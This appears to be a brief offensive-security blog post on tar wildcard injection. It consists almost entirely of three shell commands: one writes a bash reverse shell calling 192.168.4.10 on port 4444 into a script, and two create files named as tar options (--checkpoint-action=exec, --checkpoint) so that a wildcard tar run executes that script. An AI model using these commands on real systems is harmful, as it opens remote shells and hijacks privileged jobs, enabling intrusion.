---
layout: post
title: tar wildcard shell
titledate: 11/01/23
tags: ["infosec", "offsec", "shell"]
---

#### passing cmd/script to tar execution

    $ echo "sh -i >& /dev/tcp/192.168.4.10/4444 0>&1" > rshell.sh
    $ echo "" > "--checkpoint-action=exec=sh rshell.sh"
    $ echo "" > --checkpoint=1